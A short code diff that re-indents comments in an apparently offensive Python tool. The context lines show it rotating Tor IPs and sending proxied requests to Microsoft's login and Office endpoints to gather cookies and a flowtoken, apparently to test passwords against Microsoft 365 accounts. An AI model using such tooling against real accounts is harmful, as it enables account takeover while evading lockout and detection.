@@ -908,7 +908,7 @@ if args.password:
                 renew_tor_ip()
                 
                 
-            # Reques 1 a For getting cookies (With Tor Proxy) :]             
+                # Reques 1 a For getting cookies (With Tor Proxy) :]             
                 url_login = "https://login.microsoftonline.com/"
                 headers_login = {
                     "Host": "login.microsoftonline.com",
@@ -953,7 +953,7 @@ if args.password:
                     print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_login}{RESET}")
                 
 
-            # Reques 2 a For getting two urls: (With Tor Proxy) :] 
+                # Reques 2 a For getting two urls: (With Tor Proxy) :] 
                 url_geturls = "https://www.office.com/login"
                 headers_geturls = {
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
@@ -986,7 +986,7 @@ if args.password:
                     print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_geturls} {RESET}")
     
     
-            # Reques 3 a For getting flowtoken parameter: (With Tor Proxy) :]
+                # Reques 3 a For getting flowtoken parameter: (With Tor Proxy) :]
                 headers_ulrs = {
                     "Host": "login.microsoftonline.com",
                     "Cookie": cookie_header,
